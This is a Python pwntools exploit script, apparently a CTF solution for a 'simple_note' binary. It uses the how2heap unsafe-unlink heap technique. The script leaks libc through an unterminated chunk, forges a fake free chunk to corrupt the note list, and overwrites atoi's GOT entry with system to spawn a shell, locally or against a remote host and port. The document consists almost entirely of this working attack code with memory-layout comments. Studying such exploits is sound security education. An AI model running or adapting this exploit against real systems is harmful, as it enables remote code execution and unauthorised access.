# --==[[ unsafe unlink
# https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c

from pwn import *

array      = 0x6020d8
fd         = array - (3*8)
bk         = array - (2*8)
atoi_got   = 0x602058
sys_off    = 0x46590

def alloc(size, data):

	r.sendlineafter('choice: \n', '1')
	r.sendlineafter('size: \n', str(size))

	if len(data) < size:
		data += "\n"

	r.sendafter('note: \n', data)

	return

def edit(idx, data):

	r.sendlineafter('choice: \n', '4')
	r.sendlineafter('index: \n', str(idx))

	r.sendafter('note: \n', data)

	return

def free(idx):

	r.sendlineafter('choice: \n', '2')
	r.sendlineafter('index: \n', str(idx))

	return

def dump(idx, until):

	r.sendlineafter('choice: \n', '3')
	r.sendlineafter('index: \n', str(idx))

	r.recvuntil(until)

	return 	u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0x88, 'A'*0x88)
	# Prevent consolidation with top chunk
	alloc(0x88, 'B'*0x88)

	# Populate 0th chunk with pointers to main arena
	free(0)

	# No null termination so we can leak the bk pointer
	alloc(0x88, 'A'*0x8)

	##########################################################################
	#
	#	0x603000:	0x0000000000000000	0x0000000000000091 <-- chunk 0
	#	0x603010:	0x4141414141414141	0x00007ffff7dd37b8
	#
	##########################################################################

	leak   = dump(0, 'A'*0x8)
	libc   = leak - 0x3c27b8
	system = libc + sys_off

	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	# Clean up the heap mess
	free(0)
	free(1)

	alloc(0x88, 'A'*0x88)
	alloc(0x88, 'B'*0x88)
	alloc(0x88, 'C'*0x88)
	alloc(0x88, 'D'*0x88)
	alloc(0x88, 'E'*0x88)

	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'F'*0x60
	fake_chunk += p64(0x80)
	fake_chunk += p8(0x90)

	edit(3, fake_chunk)

	##########################################################################
	#
	#	0x6031b0:	0x4343434343434343	0x0000000000000091 <-- chunk 3
	#	0x6031c0:	0x0000000000000000	0x0000000000000008 <-- fake chunk [free]
	#	0x6031d0:	0x00000000006020c0	0x00000000006020c8
	#	0x6031e0:	0x4646464646464646	0x4646464646464646
	#	0x6031f0:	0x4646464646464646	0x4646464646464646
	#	0x603200:	0x4646464646464646	0x4646464646464646
	#	0x603210:	0x4646464646464646	0x4646464646464646
	#	0x603220:	0x4646464646464646	0x4646464646464646
	#	0x603230:	0x4646464646464646	0x4646464646464646
	#	0x603240:	0x0000000000000080	0x0000000000000090 <-- chunk 4 [about to get free'd]
	#	0x603250:	0x4545454545454545	0x4545454545454545
	#	0x603260:	0x4545454545454545	0x4545454545454545
	#
	##########################################################################

	# unlink
	free(4)

	##########################################################################
	#
	#	0x6020c0 <list>:	0x0000000000603010	0x00000000006030a0
	#	0x6020d0 <list+16>:	0x0000000000603130	0x00000000006020c0 <-- &list[0]
	#	0x6020e0 <list+32>:	0x0000000000603250
	#
	##########################################################################


	edit(3, p64(atoi_got)[0:3])

	##########################################################################
	#
	#	0x6020c0 <list>:	0x0000000000602058	0x00000000006030a0
	#	0x6020d0 <list+16>:	0x0000000000603130	0x00000000006031c0
	#	0x6020e0 <list+32>:	0x0000000000603250
	#	
	##########################################################################

	# atoi => system
	edit(0, p64(system)[0:3])

	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./simple_note')
        pause()
        pwn()
